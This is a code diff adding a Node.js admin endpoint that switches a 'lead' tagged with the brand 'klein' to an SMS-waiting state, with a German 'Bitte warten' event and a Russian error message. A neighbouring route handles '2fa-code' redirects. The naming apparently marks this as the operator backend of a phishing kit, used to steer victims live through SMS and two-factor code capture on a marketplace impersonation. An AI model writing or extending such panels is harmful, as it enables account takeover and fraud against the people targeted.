@@ -2328,6 +2328,37 @@ async function handle(scope) {
     return true;
   }
 
+  if (pathname === '/api/redirect-klein-sms-wait' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const idResolved = resolveLeadId(String(id).trim());
+      const lead = readLeadById(idResolved);
+      if (!lead) return send(res, 404, { ok: false });
+      if ((lead.brand || '').toLowerCase() !== 'klein') {
+        return send(res, 400, { ok: false, error: 'Только для Klein' });
+      }
+      const nowBump = new Date().toISOString();
+      lead.lastSeenAt = nowBump;
+      lead.adminListSortAt = nowBump;
+      lead.scriptStatus = 'klein_sms_wait';
+      pushEvent(lead, 'SMS Kl: Bitte warten', 'admin');
+      persistLeadPatch(idResolved, {
+        scriptStatus: lead.scriptStatus,
+        lastSeenAt: lead.lastSeenAt,
+        adminListSortAt: lead.adminListSortAt,
+        eventTerminal: lead.eventTerminal
+      });
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
   if (pathname === '/api/redirect-2fa-code' && req.method === 'POST') {
     if (!checkAdminAuth(req, res)) return;
     let body = '';
